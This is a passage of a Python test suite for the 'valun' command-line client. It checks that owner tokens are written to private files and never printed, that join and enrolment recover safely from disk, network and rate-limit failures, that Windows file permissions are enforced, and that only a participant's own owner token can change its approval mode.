                                  f'be reading it. No copy of it is kept, so nobody can sign in to the owner console '
                                  f'({SERVER}/pilot#owner) for {S_ID}, to approve what it holds for you, change limits or '
                                  'revoke the agent, until the operator of this server issues a new owner token for it, '
                                  'at your request.', out)
                self.assertIn('Joined Valun as stranger', out)
                self.assertTrue(out.rstrip().endswith('was not written.'), out)

    def test_a_token_file_not_written_is_named_file_and_said_what_it_is(self):
        # The RC's review (R2-OTHER-9 c): where the token file could not be named as one word (not written here), the
        # next commands printed --owner-token-file FILE with nothing that said FILE is the owner token file.
        with self.no_file_at_all():
            rc, out = self.run_join(file=False)                  # console, a sandbox join's default
        self.assertEqual(rc, 1, out)
        self.assertIn('config approvals MODE --owner-token-file FILE` (MODE: ask, client-prompt or none; FILE: the file '
                      'holding your owner token).', out)
        with self.no_file_at_all():
            rc, out = self.run_cli('--profile', 'asker', 'join', '--sandbox', '--handle', 'asker', '--operator', 'Ann',
                                   '--approvals', 'ask', '--server', SERVER)
        self.assertEqual(rc, 1, out)
        self.assertIn('config approvals console --owner-token-file FILE` (FILE: the file holding your owner token) lets your '
                      'agent sign at once', out)

    def test_console_approvals_are_recorded_only_once_the_mandate_holds_them(self):
        # The PUT fails: the profile asks before each commitment (not 'console', which the server does not hold yet), its
        # client signs no set-off while auto_clear could not be turned off, and the command join names finishes it.
        self.rate_limit('PUT /pilot/v1/owner/mandate')
        rc, out = self.run_join('--approvals', 'console', '--clearing', 'off')
        self.assertEqual(rc, 1, out)
        self.assertEqual(self.token_in_file(), 'vpo_test-only\n')
        disk = self.disk()
        self.assertEqual(disk['approvals'], 'ask')
        self.assertEqual(disk['consent_policy'], dict(va.SANDBOX_CONSENT_POLICY, setoff=False))
        self.assertIn(f'`valun --profile s config approvals console --owner-token-file {cli._faithful(self.token_file, 300)}`', out)
        self.assertIn('Then run `valun --profile s doctor`.', out)
        self.assertIn('auto_clear was not turned off', out)
        rc, out = self.run_cli('config', 'approvals', 'console', '--owner-token-file', self.token_file)
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.world.puts, [{'approve_above': 0, 'review_deliveries': True}])
        self.assertEqual(self.disk()['approvals'], 'console')

    def test_the_commands_join_prints_finish_this_profile_and_no_other(self):
        # FX2-PY attempt 2: another identity is in the default profile (its own participant, approvals ask). This join
        # (profile s, console approvals) gets a 429 on its mandate PUT. The commands it prints name profile s: run exactly
        # as printed, in a shell without VALUN_PROFILE, they finish profile s and leave the default profile untouched.
        default, before = self.other_profile('default')
        self.rate_limit('PUT /pilot/v1/owner/mandate')
        rc, joined = self.run_join('--approvals', 'console')
        self.assertEqual(rc, 1, joined)
        config, doctor = self.printed(joined, 'until you run'), self.printed(joined, 'Then run')
        rc, out = self.main(config)
        self.assertEqual(rc, 0, out)
        self.assertIn('Owner mandate updated (approve_above 0, review_deliveries on): ' + cli.CONSOLE_HOLDS
                      + ' now wait for you in the owner console', out)
        self.assertEqual(self.world.puts, [{'approve_above': 0, 'review_deliveries': True}])     # S's mandate (S's token)
        self.assertEqual(self.disk()['approvals'], 'console')
        self.unchanged(default, before)
        rc, out = self.main(doctor)
        self.assertEqual(rc, 0, out)
        self.assertIn('Agent accepted by the server as stranger', out)                          # profile s, joined as S
        self.assertIn('Approvals: console.', out)
        self.unchanged(default, before)
        self.assertEqual(config, ['--profile', 's', 'config', 'approvals', 'console', '--owner-token-file', self.token_file])
        self.assertEqual(doctor, ['--profile', 's', 'doctor'])

    def test_a_join_names_its_profile_in_the_commands_it_prints(self):
        # Every command a join prints names its profile (only `valun mcp --help`, the same for every profile, does not).
        out = self.join()
        self.assertEqual([x for x in re.findall(r'`valun ([^`]+)`', out) if not x.startswith('--profile s ')], ['mcp --help'])
        self.assertEqual(self.printed(out, 'Next: run'), ['--profile', 's', 'doctor'])
        self.assertIn('  - In an MCP app: add `valun --profile s mcp` to it', out)
        self.assertIn('change it with `valun --profile s config consents.<role> on|off`', out)
        # VALUN_PROFILE set but empty selects the default profile: the commands name it (not an empty --profile).
        rc, out = self.main(['join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--approvals', 'none',
                             '--server', SERVER, '--owner-token-file', os.path.join(self.home.name, 'owner-2.txt')],
                            env={'VALUN_PROFILE': ''})
        self.assertEqual(rc, 0, out)
        self.assertEqual([x for x in re.findall(r'`valun ([^`]+)`', out) if not x.startswith('--profile default ')],
                         ['mcp --help'])
        self.assertTrue(os.path.exists(os.path.join(self.home.name, 'profiles', 'default.json')))

    def test_a_429_at_enrolment_still_hands_the_token_over(self):
        # The participant exists once join answered: its owner token is the way to a new enrollment code. The profile is
        # not saved, so the enroll command join prints names the server as well as the profile: run exactly as printed
        # (in a shell without VALUN_SERVER), it registers this profile's key with the server the participant is on.
        self.rate_limit('POST /pilot/v1/enroll')
        rc, out = self.run_join(file=False)
        self.assertEqual(rc, 1, out)
        self.assertIn("this agent's key could not be registered (rate_limited)", out)
        self.assertEqual(self.token_in_file(self.default_file()), 'vpo_test-only\n')    # handed over: the default file
        self.assertNotIn('vpo_test-only', out)
        path = os.path.join(self.home.name, 'profiles', 's.json')
        self.assertFalse(os.path.exists(path) and 'participant_id' in self.disk())
        enroll = self.printed(out, 'then run')
        self.assertEqual(enroll, ['--profile', 's', 'enroll', '--server', SERVER, '--participant', S_ID])
        servers = []

        def request(client, method, p, body=None, auth=True, token=None):
            servers.append(client._server or client.state.get('server'))
            return self.world.handle(method, p, json.loads(json.dumps(body)) if body is not None else None, token)
        with mock.patch.object(vc.Client, 'request', request), mock.patch.object(cli.getpass, 'getpass', return_value='code'):
            rc, out = self.main(enroll)
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.world.requests()[-4:], ['GET /pilot/v1/info', 'POST /pilot/v1/enroll', 'GET /pilot/v1/me',
                                                      'GET /pilot/v1/info'])
        self.assertEqual(set(servers), {SERVER})
        self.assertEqual((self.disk()['participant_id'], self.disk()['server']), (S_ID, SERVER))

    def test_a_token_file_that_cannot_be_written_after_the_join_is_never_on_stdout(self):
        # The folder took files when join checked it and none once the join was answered: join does its other steps,
        # then exits 1 (a script that relies on the file sees it); the token is on no output an agent reads.
        with self.no_file_at_all():
            rc, out = self.run_join('--approvals', 'none')
        self.assertEqual(rc, 1, out)
        self.assertIn(f'Cannot write {self.token_file} (No space left on device).', out)
        self.assertNotIn('vpo_test-only', out)
        self.assertEqual(self.world.puts, [{'approve_above': 5, 'auto_clear': True}])        # the mandate step was done
        self.assertEqual((self.disk()['participant_id'], self.disk()['approvals']), (S_ID, 'none'))
        self.assertNotIn('vpo_test-only', json.dumps(self.disk()))
        self.assertEqual(out.rstrip().splitlines()[-1], f'Exit code 1: {self.token_file} was not written.')
        self.assertFalse(os.path.exists(self.token_file))

    # ---------- FX3-PY: decision D-3 c (the token first, whatever fails after the join answer) and O_EXCL ----------
    DISK_FULL = (28, 'No space left on device')

    def failing_update(self, when):
        """FileStore.update raises a disk-full OSError for a change `when(state after it)` picks; others go through."""
        real = vc.FileStore.update

        def update(store, fn):
            probe = json.loads(json.dumps(store.state))
            fn(probe)
            if when(probe):
                raise OSError(*self.DISK_FULL)
            return real(store, fn)
        return mock.patch.object(vc.FileStore, 'update', update)

    def failing_save(self, when):
        """FileStore.save raises a disk-full OSError on the calls `when(n, state)` picks (n counts from 1)."""
        real, calls = vc.FileStore.save, []

        def save(store):
            calls.append(1)
            if when(len(calls), store.state):
                raise OSError(*self.DISK_FULL)
            return real(store)
        return mock.patch.object(vc.FileStore, 'save', save)

    def stopped(self, out, not_done):
        """join stopped on the disk-full error with the token handed over, said what is not done, and no traceback."""
        self.assertIn('Joining stopped (OSError): [Errno 28] No space left on device', out)
        self.assertIn(f'  Your participant {S_ID} exists, and your owner token was handed over above. Not done: '
                      + not_done, out)
        self.assertIn('Then run `valun --profile s doctor`.', out)
        self.assertNotIn('Traceback', out)
        self.assertEqual(self.token_in_file(), 'vpo_test-only\n')
        self.assertLess(out.index('Your OWNER token is in'), out.index('Joining stopped'))

    def test_the_token_is_handed_over_before_the_agent_key_is_registered(self):
        # The token file exists when POST /enroll is sent (here it gets a 429), and so does the agent's key, saved in the
        # profile (the Nov 17 tester report: a key kept only in memory was lost with an answer lost on the way). A 429 is no
        # answer about the code, which stays valid: the key and the code stay kept, for `valun enroll` to send again.
        seen, handle = [], self.world.handle
        path = os.path.join(self.home.name, 'profiles', 's.json')

        def spy(method, p, body=None, token=None):
            kept = os.path.exists(path) and (self.disk().get('pending_enrollment') or {}).get('pubkey')
            seen.append((f'{method} {p}', os.path.exists(self.token_file), bool(kept) and kept == (body or {}).get('pubkey')))
            return handle(method, p, body, token)
        self.world.handle = spy
        self.rate_limit('POST /pilot/v1/enroll')
        rc, out = self.run_join('--approvals', 'none')
        self.assertEqual(rc, 1, out)
        self.assertEqual(seen, [('POST /pilot/v1/join-sandbox', False, False), ('POST /pilot/v1/enroll', True, True)])
        self.assertEqual(self.token_in_file(), 'vpo_test-only\n')
        self.assertLess(out.index('Your OWNER token is in'), out.index("this agent's key could not be registered (rate_limited)"))
        disk = self.disk()
        self.assertNotIn('participant_id', disk)
        self.assertNotIn('agent_token', disk)
        self.assertEqual((disk['pending_enrollment']['participant_id'], disk['pending_enrollment']['code']), (S_ID, 'code'))
        self.assertNotIn('vpo_test-only', json.dumps(disk))
        self.assertIn('To finish: run `valun --profile s enroll` in a moment', out)

    def test_a_key_that_cannot_be_stored_still_hands_the_token_over(self):
        # The enrolment's save fails (OSError, not a ValunError): no traceback; the token is in its file. POST /enroll
        # was answered, so the server holds this agent's key, and it refuses a new enrollment code while it does
        # (already_enrolled): join says so, and that revoking the agent gives the code the printed enroll command needs.
        with self.failing_save(lambda n, state: True):
            rc, out = self.run_join('--approvals', 'none')
        self.assertEqual(rc, 1, out)
        self.assertIn(f"Your participant {S_ID} was created, and the server holds this agent's key, but the key could not "
                      'be stored here (OSError): [Errno 28] No space left on device', out)
        self.assertIn(f'To finish: in the owner console ({SERVER}/pilot#owner), with your owner token, revoke this agent, '
                      'which gives a new enrollment code (a new code is refused while a key is registered), then run '
                      f'`valun --profile s enroll --server {SERVER} --participant {S_ID}`.', out)
        self.assertNotIn('could not be registered', out)
        self.assertNotIn('issue an enrollment code', out)
        self.assertEqual(self.printed(out, 'then run'), ['--profile', 's', 'enroll', '--server', SERVER, '--participant', S_ID])
        self.assertNotIn('Traceback', out)
        self.assertEqual(self.token_in_file(), 'vpo_test-only\n')
        # Every save failed, so no agent token is stored; the key the server registered was saved before the request.
        disk = self.disk()
        self.assertNotIn('agent_token', disk)
        self.assertNotIn('participant_id', disk)
        self.assertEqual(disk['pending_enrollment']['pubkey'], self.world.keys[S_ID]['pubkey'])
        self.assertEqual(self.world.puts, [])

    def test_an_enrolment_whose_answer_was_not_read_may_have_registered_the_key(self):
        # POST /enroll times out while its answer is read (not a ValunError), three times: whether the server holds the
        # key is not known. The key and the code were saved before the first request, so `valun enroll` sends the same
        # enrollment again, with no code to give (the Nov 17 tester report: 0.7.1 lost the key with the answer).
        handle, sent = self.world.handle, []

        def slow(method, path, body=None, token=None):
            out = handle(method, path, body, token)
            if path == '/pilot/v1/enroll':
                sent.append(body)
                if len(sent) <= 3:
                    raise TimeoutError('The read operation timed out')
            return out
        self.world.handle = slow
        rc, out = self.run_join('--approvals', 'none')
        self.assertEqual(rc, 1, out)
        self.assertEqual(len(sent), 3)
        self.assertTrue(all(b == sent[0] for b in sent), 'the same key, code and proof each time')
        self.assertIn(f"Your participant {S_ID} was created, and this agent's key is saved in this profile, but no answer "
                      'to its enrollment arrived (3 tries; the last: TimeoutError: The read operation timed out).', out)
        self.assertIn('To finish: run `valun --profile s enroll` (or this join again) while the enrollment code is valid: '
                      'it sends the same enrollment again, with no code to give.', out)
        self.assertEqual(self.token_in_file(), 'vpo_test-only\n')
        self.assertNotIn('Traceback', out)
        self.assertEqual(self.disk()['pending_enrollment']['pubkey'], sent[0]['pubkey'])
        rc, out = self.run_cli('enroll')
        self.assertEqual(rc, 0, out)
        same = lambda b: {k: v for k, v in b.items() if k != 'signature'}     # noqa: E731 - a new proof, same key and code
        self.assertEqual(same(sent[3]), same(sent[0]))
        disk = self.disk()
        self.assertEqual((disk['participant_id'], disk['pubkey']), (S_ID, sent[0]['pubkey']))
        self.assertNotIn('pending_enrollment', disk)
        self.assertEqual(disk['consent_policy'], va.SANDBOX_CONSENT_POLICY)
        self.assertEqual((disk['consent_loop'], disk['approvals']), ('on', 'none'))

    def test_an_enrolment_answer_on_another_network_may_have_registered_the_key(self):
        # 0.5: the core checks the network the enroll answer names (wrong_network) after the server registered the key.
        # That is not a refusal: join says the server may hold the key and how to finish, never "issue a code" (0.5.1).
        handle = self.world.handle

        def other_network(method, path, body=None, token=None):
            out = handle(method, path, body, token)
            return dict(out, network='valun-testnet-1') if path == '/pilot/v1/enroll' and isinstance(out, dict) else out
        self.world.handle = other_network
        rc, out = self.run_join('--approvals', 'none')
        self.assertEqual(rc, 1, out)
        self.assertIn(f"Your participant {S_ID} was created, and the server may hold this agent's key, but the key could "
                      'not be stored here (wrong_network)', out)
        self.assertIn('revoke this agent, which gives a new enrollment code', out)
        self.assertNotIn('could not be registered', out)
        self.assertNotIn('Traceback', out)
        self.assertEqual(self.token_in_file(), 'vpo_test-only\n')

    def test_a_join_answer_without_an_owner_token_writes_nothing(self):
        # Nothing to hand over: join says so and exits 1 before any agent key, token file or profile is written.
        route = self.world.route
        for answer in ({'owner_token': None}, {'owner_token': ''}, {'owner_token': 7}, {}):
            def no_token(method, r, q, body, token, answer=answer):
                out = route(method, r, q, body, token)
                if r == '/pilot/v1/join-sandbox':
                    out = {k: v for k, v in dict(out, **answer).items() if answer or k != 'owner_token'}
                return out
            self.world.route = no_token
            asked = len(self.world.log)
            rc, out = self.run_join('--approvals', 'none')
            self.assertEqual(rc, 1, out)
            self.assertEqual(out, 'Joining failed (bad_response): the server did not answer an owner token.\n', answer)
            self.assertEqual(self.world.requests()[asked:], ['POST /pilot/v1/join-sandbox'], answer)
            self.assertFalse(os.path.exists(self.token_file), answer)
            self.assertFalse(os.path.exists(os.path.join(self.home.name, 'profiles', 's.json')), answer)

    def test_a_key_stored_before_a_later_save_failed_carries_on(self):
        # The enrolment stored the key and token (its first save), and its second save of the same profile failed: the
        # profile on disk holds the key, so join goes on with it and finishes every step.
        with self.failing_save(lambda n, state: n == 2):
            rc, out = self.run_join('--approvals', 'none')
        self.assertEqual(rc, 0, out)
        self.assertIn('Joined Valun as stranger', out)
        disk = self.disk()
        self.assertEqual((disk['participant_id'], disk['approvals'], disk['agent_token']), (S_ID, 'none', AGENT_TOKEN))
        self.assertEqual(self.world.puts, [{'approve_above': 5, 'auto_clear': True}])
        self.assertNotIn('vpo_test-only', json.dumps(disk))

    def test_settings_that_cannot_be_saved_stop_join_with_the_token_handed_over(self):
        with self.failing_save(lambda n, state: 'consent_policy' in state):
            rc, out = self.run_join('--approvals', 'none')
        self.assertEqual(rc, 1, out)
        self.stopped(out, "this profile's settings (until they are set it asks before each commitment, and its client "
                          'signs no consent by itself)')
        disk = self.disk()                                          # as the enrolment saved it: the safe defaults
        self.assertEqual(disk['participant_id'], S_ID)
        self.assertNotIn('approvals', disk)
        self.assertNotIn('consent_policy', disk)
        self.assertEqual(self.world.puts, [])                       # the mandate step was not reached
        self.assertNotIn('vpo_test-only', json.dumps(disk))

    def test_pins_that_cannot_be_written_stop_join_with_the_token_handed_over(self):
        with self.failing_update(lambda state: 'pins' in state):
            rc, out = self.run_join('--approvals', 'none')
        self.assertEqual(rc, 1, out)
        self.stopped(out, "your owner mandate's approve_above and auto_clear")
        self.assertEqual(self.world.puts, [])
        self.assertNotIn('pins', self.disk())
        self.assertIs(self.disk()['consent_policy']['setoff'], True)              # --clearing auto: as it was

    def test_with_clearing_off_a_stop_before_the_mandate_turns_set_offs_off_here(self):
        # --clearing off, and the pin write fails (OSError) before auto_clear was sent: as when the mandate request
        # fails, this profile's client then signs no set-off by itself (consents.setoff off), and join says so.
        with self.failing_update(lambda state: 'pins' in state):
            rc, out = self.run_join('--approvals', 'none', '--clearing', 'off')
        self.assertEqual(rc, 1, out)
        self.stopped(out, "your owner mandate's approve_above and auto_clear")
        self.assertIn('  Clearing: auto_clear was not turned off, so your client signs no set-off by itself (consents.setoff '
                      'off); turn auto_clear off in the owner console too.\nThen run `valun --profile s doctor`.', out)
        self.assertEqual(self.world.puts, [])
        policy = self.disk()['consent_policy']
        self.assertEqual(policy, dict(va.SANDBOX_CONSENT_POLICY, setoff=False))     # its other roles as they were

    def test_with_clearing_off_a_set_off_switch_that_cannot_be_written_after_a_stop_says_how(self):
        # The same, and consents.setoff off cannot be written either: join prints the command that does it, and that
        # command, run as printed in another shell, turns it off.
        with self.failing_update(lambda state: 'pins' in state or (state.get('consent_policy') or {}).get('setoff') is False):
            rc, out = self.run_join('--approvals', 'none', '--clearing', 'off')
        self.assertEqual(rc, 1, out)
        self.stopped(out, "your owner mandate's approve_above and auto_clear")
        self.assertIn('  Not done either (OSError): consents.setoff off in this profile, so its client may still sign '
                      'set-offs by itself: run `valun --profile s config consents.setoff off`.', out)
        self.assertIs(self.disk()['consent_policy']['setoff'], True)
        rc, done = self.main(self.printed(out, 'by itself: run'))
        self.assertEqual(rc, 0, done)
        self.assertIs(self.disk()['consent_policy']['setoff'], False)

    def test_console_approvals_that_cannot_be_recorded_stop_join_on_the_safe_side(self):
        # The mandate holds every commitment for the owner, but the profile cannot record console: it still asks before
        # each commitment, and the printed command, run as printed in another shell, finishes it.
        with self.failing_update(lambda state: state.get('approvals') == 'console'):
            rc, out = self.run_join('--approvals', 'console')
        self.assertEqual(rc, 1, out)
        self.stopped(out, 'console approvals in this profile: it asks before each commitment until you run '
                          '`valun --profile s config approvals console --owner-token-file FILE`')
        self.assertEqual(self.world.puts, [{'approve_above': 0, 'review_deliveries': True, 'auto_clear': True}])
        self.assertEqual(self.disk()['approvals'], 'ask')
        rc, done = self.main(self.printed(out, 'until you run'))
        self.assertEqual(rc, 0, done)
        self.assertEqual(self.disk()['approvals'], 'console')

    def test_a_set_off_switch_that_cannot_be_written_says_how_to_turn_it_off(self):
        # The mandate PUT gets a 429 with --clearing off, and the profile cannot record consents.setoff off: join says
        # so, and the command it prints, run as printed in another shell, turns it off.
        self.rate_limit('PUT /pilot/v1/owner/mandate')
        with self.failing_update(lambda state: (state.get('consent_policy') or {}).get('setoff') is False):
            rc, out = self.run_join('--approvals', 'none', '--clearing', 'off')
        self.assertEqual(rc, 1, out)
        self.assertIn('Your owner mandate could not be set (rate_limited)', out)
        self.stopped(out, 'consents.setoff off in this profile, so its client may still sign set-offs by itself: run '
                          '`valun --profile s config consents.setoff off`')
        self.assertIs(self.disk()['consent_policy']['setoff'], True)
        rc, done = self.main(self.printed(out, 'by itself: run'))
        self.assertEqual(rc, 0, done)
        self.assertIs(self.disk()['consent_policy']['setoff'], False)

    def test_a_429_after_the_join_answer_never_loses_the_token_that_went_to_a_new_file(self):
        # Without --owner-token-file, and its default file made while the join was on its way: whichever request gets
        # the 429, the token is in a new file beside it before that step's report, and never on stdout.
        handle = self.world.handle

        def another_join(method, path, body=None, token=None):
            if path == '/pilot/v1/join-sandbox':
                with open(self.default_file(), 'w', encoding='utf-8') as f:
                    f.write('vpo_another-identity\n')
            return handle(method, path, body, token)
        self.world.handle = another_join
        for route, said in (('POST /pilot/v1/enroll', "this agent's key could not be registered (rate_limited)"),
                            ('GET /pilot/v1/owner', 'Your owner mandate could not be set (rate_limited)'),
                            ('PUT /pilot/v1/owner/mandate', 'Your owner mandate could not be set (rate_limited)')):
            name = 'r' + str(len(route))
            self.world.fail[route] = [vc.ValunError(*self.RATE)]
            out = io.StringIO()
            with contextlib.redirect_stdout(out):
                rc = cli.main(['--profile', name, 'join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann',
                               '--approvals', 'none', '--server', SERVER])
            out = out.getvalue()
            self.assertEqual(rc, 1, out)
            sibling = self.default_file().replace('.txt', '.1.txt')
            self.assertEqual(self.token_in_file(sibling), 'vpo_test-only\n', route)
            self.assertNotIn('vpo_test-only', out, route)
            self.assertLess(out.index(f'your OWNER token is in a new file beside it: {sibling}'), out.index(said), route)
            path = os.path.join(self.home.name, 'profiles', f'{name}.json')
            if os.path.exists(path):
                with open(path, encoding='utf-8') as f:
                    self.assertNotIn('vpo_test-only', f.read(), route)
            for p in (self.default_file(), sibling):
                os.unlink(p)

    def test_a_new_token_file_is_created_and_holds_only_the_token(self):
        self.assertFalse(os.path.exists(self.token_file))
        rc, out = self.run_join('--approvals', 'none')
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.token_in_file(), 'vpo_test-only\n')
        self.assertNotIn('vpo_test-only', out)                       # written, not shown
        if os.name != 'nt':
            self.assertEqual(os.stat(self.token_file).st_mode & 0o777, 0o600)

    def windows_shared_folder(self, name):
        """A folder whose permissions let Users (BU) change what is in it, as the staging test's home under %TEMP% let
        another group in."""
        import subprocess
        folder = os.path.join(self.home.name, name)
        os.makedirs(folder)
        subprocess.run(['icacls', folder, '/grant', '*S-1-5-32-545:(OI)(CI)M'], capture_output=True, check=True)
        return folder

    @unittest.skipUnless(os.name == 'nt', 'Windows permissions')
    def test_on_windows_a_new_token_file_is_owner_only_whatever_its_folder_allows(self):
        """The RC's staging test (2026-11-18), problem 7: os.open's 0o600 is ignored on Windows, so the owner token file
        took its folder's permissions (icacls: "HOST\\CodexSandboxUsers:(I)(M)"), while the docs said "a new private
        file (0600)". It is now created with a DACL that lets in only this user (named by its SID: the RC's review,
        windows-acl W1), SYSTEM and Administrators."""
        import subprocess
        from valun import home
        path = os.path.join(self.windows_shared_folder('shared'), 'owner.txt')
        cli._write_private(path, 'vpo_test-only\n')
        acl = subprocess.run(['icacls', path], capture_output=True, text=True, check=True).stdout
        self.assertNotIn('(I)', acl, f'nothing inherited from its folder: {acl}')
        self.assertTrue(home._sddl_of(path).endswith(home.private_sddl(home._user_sid())), home._sddl_of(path))
        self.assertEqual((home.others_with_access(path), cli._not_private_note(path)), ([], ''))
        with open(path, 'rb') as f:
            self.assertEqual(f.read(), b'vpo_test-only\r\n')
        # a file that takes its folder's permissions is named so: whom else they let in
        plain = os.path.join(os.path.dirname(path), 'plain.txt')
        with open(plain, 'w', encoding='utf-8') as f:
            f.write('x')
        self.assertEqual(home.others_with_access(plain), ['S-1-5-32-545'])
        self.assertIn('it can also be opened by BUILTIN\\Users (S-1-5-32-545), whom its folder lets in',
                      cli._not_private_note(plain))

    @unittest.skipUnless(os.name == 'nt', 'Windows permissions')
    def test_on_windows_doctor_reads_the_profile_files_permissions(self):
        """The RC's staging test (2026-11-18): doctor said "Profile file permissions: private" on Windows without looking."""
        from valun import home
        self.join()
        rc, out = self.run_cli('doctor')
        self.assertIn('ok    Profile file permissions: private', out)
        shared = self.windows_shared_folder('shared-home')
        os.makedirs(os.path.join(shared, 'profiles'))
        with open(os.path.join(self.home.name, 'profiles', 's.json'), encoding='utf-8') as f, \
                open(os.path.join(shared, 'profiles', 's.json'), 'w', encoding='utf-8') as g:
            g.write(f.read())
        with mock.patch.dict(os.environ, {'VALUN_HOME': shared}):
            rc, out = self.run_cli('doctor')
        self.assertNotIn('Profile file permissions: private', out)
        profile = os.path.join(shared, 'profiles', 's.json')
        me = home._user_sid()
        self.assertIn(f"FIX   {profile} can also be opened by BUILTIN\\Users (S-1-5-32-545), whom its folder lets in, so "
                      f'your agent\'s key in it is not private. Fix: `icacls "{profile}" /inheritance:r /grant:r *{me}:F '
                      '*S-1-5-18:F *S-1-5-32-544:F`; and close its folder, which lets them in too, or they could still '
                      f'replace the profile: `icacls "{os.path.dirname(profile)}" /inheritance:r /grant:r "*{me}:(OI)(CI)F" '
                      '"*S-1-5-18:(OI)(CI)F" "*S-1-5-32-544:(OI)(CI)F"` (valun also writes the profile owner-only the next '
                      'time it saves it).', out)
        self.assertNotIn('such as the default one', out, 'never the folder it is in as the place to move it to')

    def test_a_token_file_that_fails_while_written_is_removed(self):
        path = os.path.join(self.home.name, 'partial.txt')
        with mock.patch.object(cli.os, 'fdopen', side_effect=OSError(*self.DISK_FULL)):
            with self.assertRaises(OSError):
                cli._write_private(path, 'vpo_test-only\n')
        self.assertFalse(os.path.exists(path))
        cli._write_private(path, 'vpo_test-only\n')                  # its descriptor was closed: the name is free again
        with self.assertRaises(FileExistsError):
            cli._write_private(path, 'vpo_other\n')
        with open(path, encoding='utf-8') as f:
            self.assertEqual(f.read(), 'vpo_test-only\n')

    def test_an_unreadable_info_leaves_clearing_on_the_safe_side(self):
        # GET /info gets a 429 at the pin step, so whether the server offers circulating credit is not known and
        # auto_clear is not sent. With --clearing off this profile's client signs no set-off by itself, and join exits 1
        # (--clearing is not in force); so it does with --clearing auto. Without --clearing nothing asked for is missing.
        for name, extra, rc_wanted, setoff in (('c-off', ['--clearing', 'off'], 1, False),
                                               ('c-auto', ['--clearing', 'auto'], 1, True), ('c-default', [], 0, True)):
            self.rate_limit('GET /pilot/v1/info')
            puts = len(self.world.puts)
            token = os.path.join(self.home.name, f'{name}.txt')
            rc, out = self.main(['--profile', name, 'join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann',
                                 '--approvals', 'none', '--server', SERVER, '--owner-token-file', token, *extra])
            self.assertEqual(rc, rc_wanted, out)
            with open(token, encoding='utf-8') as f:
                self.assertEqual(f.read(), 'vpo_test-only\n', name)
            self.assertEqual(self.world.puts[puts:], [{'approve_above': 5}], name)          # no auto_clear sent
            with open(os.path.join(self.home.name, 'profiles', f'{name}.json'), encoding='utf-8') as f:
                self.assertEqual(json.load(f)['consent_policy'], dict(va.SANDBOX_CONSENT_POLICY, setoff=setoff), name)
            self.assertNotIn('does not offer circulating credit', out, name)
            if extra:
                self.assertIn('Clearing: whether this server offers circulating credit could not be read (rate_limited), '
                              f'so --clearing {extra[1]} was not set in your owner mandate (auto_clear).', out)
            else:
                self.assertNotIn('Clearing:', out)
            self.assertEqual('Your client signs no set-off by itself (consents.setoff off)' in out, not setoff, name)
        # The pin step and the mandate step both fail: with --clearing off the client still signs no set-off by itself.
        self.rate_limit('GET /pilot/v1/info')
        self.rate_limit('PUT /pilot/v1/owner/mandate')
        puts = len(self.world.puts)
        rc, out = self.main(['--profile', 'c-both', 'join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann',
                             '--approvals', 'none', '--server', SERVER, '--clearing', 'off', '--owner-token-file',
                             os.path.join(self.home.name, 'c-both.txt')])
        self.assertEqual((rc, len(self.world.puts)), (1, puts), out)
        with open(os.path.join(self.home.name, 'profiles', 'c-both.json'), encoding='utf-8') as f:
            self.assertEqual(json.load(f)['consent_policy'], dict(va.SANDBOX_CONSENT_POLICY, setoff=False))
        self.assertIn('Clearing: auto_clear was not turned off, so your client signs no set-off by itself', out)


class ConsoleSwitchChecksTheOwner(Cli):
    """FX2-PY attempt 2: `valun config approvals` to or from console changes the owner mandate of the owner token's
    participant, so it refuses (not_owner; nothing sent after GET /owner, no profile changed) unless GET /owner names
    this profile's participant: else the profile would stop asking while another participant's mandate changed."""

    def test_only_the_owner_token_of_this_profiles_participant_switches(self):
        self.join()                                 # profile s: participant S, approvals none, S's owner token in a file
        joined = self.disk()
        default, before = self.other_profile('default')                      # another participant's, approvals ask
        held, held_before = self.other_profile('held', approvals='console')  # another participant's, approvals console
        agent, empty = (os.path.join(self.home.name, n) for n in ('agent.txt', 'empty.txt'))
        for path, text in ((agent, AGENT_TOKEN + '\n'), (empty, ' \n')):
            with open(path, 'w', encoding='utf-8') as f:
                f.write(text)
        puts = len(self.world.puts)
        for argv in (['config', 'approvals', 'console', '--owner-token-file', self.token_file],     # S's token, default
                     ['--profile', 'held', 'config', 'approvals', 'none', '--owner-token-file', self.token_file],
                     ['--profile', 's', 'config', 'approvals', 'console', '--owner-token-file', agent]):   # 404 there
            n = len(self.world.log)
            rc, out = self.main(argv)
            self.assertEqual(rc, 1, out)
            self.assertIn('Could not change the mandate (not_owner): ', out)
            self.assertIn('needs the owner token of its participant', out)
            self.assertEqual(self.world.requests()[n:], ['GET /pilot/v1/owner'], argv)
        n = len(self.world.log)
        rc, out = self.main(['--profile', 's', 'config', 'approvals', 'console', '--owner-token-file', empty])
        self.assertEqual((rc, out.strip(), self.world.requests()[n:]), (1, 'No owner token given; nothing was changed.', []))
        # An answer that names no participant does not show whose mandate the token changes: refused too.
        handle = self.world.handle

        def anonymous(method, path, body=None, token=None):
            got = handle(method, path, body, token)
            if (method, path) == ('GET', '/pilot/v1/owner'):
                got.pop('participant', None)
            return got
        self.world.handle = anonymous
        rc, out = self.main(['--profile', 's', 'config', 'approvals', 'console', '--owner-token-file', self.token_file])
        self.world.handle = handle
        self.assertEqual(rc, 1, out)
        self.assertIn('Could not change the mandate (not_owner): ', out)
        self.assertEqual(len(self.world.puts), puts)
        self.unchanged(default, before)
        self.unchanged(held, held_before)
        self.assertEqual(self.disk(), joined)
        # This profile's own owner token: the switch is made, both ways.
        rc, out = self.main(['--profile', 's', 'config', 'approvals', 'console', '--owner-token-file', self.token_file])
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.disk()['approvals'], 'console')
        rc, out = self.main(['--profile', 's', 'config', 'approvals', 'none', '--owner-token-file', self.token_file])
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.world.puts[puts:], [{'approve_above': 0, 'review_deliveries': True}, {'approve_above': 5}])
        self.assertEqual(self.disk()['approvals'], 'none')


class ConsoleSwitchAsksForTheToken(Cli):
    """#136 item 1: `valun config approvals` to or from console takes the owner token from a hidden prompt when no
    --owner-token-file is given (the site tells owners to move that file out of their agent's reach once console is
    set); without a terminal it still says how. #136 item 3: Ctrl+C in the tour ends with a short message, no traceback.
    And `valun mcp --help` names the pinned uvx form, never a bare valun."""

